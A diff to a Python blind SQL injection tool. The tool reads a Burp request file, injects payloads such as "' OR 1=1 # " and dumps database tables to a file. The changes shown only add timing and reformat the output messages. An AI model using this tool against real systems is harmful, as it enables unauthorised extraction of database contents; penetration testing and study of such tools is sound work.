@@ -22,6 +22,7 @@ import argparse
 import pandas       as     pd
 import requests
 import string
+import time
 
 try:
 	import Burpee.burpee as burp
@@ -39,6 +40,7 @@ class Style:
 	TAB       = '\t'
 	UNDERLINE = '\033[4m'
 	YELLOW    = '\033[93m'
+	good = '\033[92m[+]\033[0m'
 
 
 # Defines the parser:
@@ -60,8 +62,6 @@ output_file       = args.output.name
 request_file      = args.Request.name
 table_names_list  = args.TableNamesList
 
-
-
 def user_inputs():
 	"""Defines the different outputs in the blind SQLi."""
 	print(
@@ -74,7 +74,6 @@ def user_inputs():
 	DB_ERROR = input(
 		f"{Style.RED}Key string if there was a database error exception (Default: 'database error'):{Style.END} ") or "database error"
 	return SUCCESS, WRONG, DB_ERROR
-
 
 def get_vars():
 	"""Returns 2 variables:
@@ -204,20 +203,21 @@ def GET():
 				retrieved_chars) + f"{Style.END}")
 			sublist.append((column_name, "".join(retrieved_chars)))
 		data.append(sublist)
-	
+		
 	# Creating Data Frame, Printing Table and Saving to output file:
 	df = pd.DataFrame([dict(subl) for subl in zip(*data)])
-	print(f"{Style.BOLD}[FINISHED]\n{Style.UNDERLINE}Retrieved Table:{Style.END} '{table_name}'")
+	print(f"\n{Style.BOLD}====== [FINISHED] ======\n{Style.UNDERLINE}Retrieved Table:{Style.END} "
+		      f"{table_name}")
 	print(df)
 	print(f"\n[INFO] Table saved to output file: {output_file}")
-	with open(output_file, 'w') as output_F:
-		output_F.write(f"[FINISHED]\nRetrieved Table: '{table_name}'\n{df}")
+	with open(output_file, 'w+') as output_F:
+		output_F.write(f"====== [FINISHED] ======\nRetrieved Table: {table_name}\n{df}")
 # ======================================================================================================================
 # ======================================================================================================================
 # noinspection PyGlobalUndefined
 def POST():
 	"""Function that will be used if the request method from the <Request File> is POST."""
-	global bracket, table_name, try_table, max_rows, retrieved_chars
+	global bracket, table_name, try_table, max_rows, retrieved_chars, finish, start
 	closing_brackets  = ["\'", "\"", "0"]
 	param, url,       = get_vars()
 	payload_extension = " OR 1=1 # "
@@ -326,16 +326,24 @@ def POST():
 	
 	# Creating Data Frame, Printing Table and Saving to output file:
 	df = pd.DataFrame([dict(subl) for subl in zip(*data)])
-	print(f"{Style.BOLD}[FINISHED]\n{Style.UNDERLINE}Retrieved Table:{Style.END} '{table_name}'")
+	print(f"\n{Style.BOLD}====== [FINISHED] ======\n{Style.UNDERLINE}Retrieved Table:{Style.END} "
+	      f"{table_name}")
 	print(df)
 	print(f"\n[INFO] Table saved to output file: {output_file}")
 	with open(output_file, 'w+') as output_F:
-		output_F.write(f"[FINISHED]\nRetrieved Table: '{table_name}'\n{df}")
+		output_F.write(f"====== [FINISHED] ======\nRetrieved Table: {table_name}\n{df}")
 
 
 if __name__ == "__main__":
 	SUCCESS, WRONG, DB_ERROR = user_inputs()
+	start = time.perf_counter()
 	headers, post_data = burp.parse_request(request_file)
 	METHOD = burp.get_method_and_resource(request_file)[0]  # Sets METHOD (POST \ GET)
 	if METHOD == "POST": POST()
 	if METHOD == "GET": GET()
+	finish = time.perf_counter()
+	print(f""
+	      f"{Style.BOLD}{Style.good} Finished table dump in: {Style.BOLD}"
+	      f"{Style.UNDERLINE}{round(finish - start, 2)}{Style.END} "
+	      f"Seconds.")
+
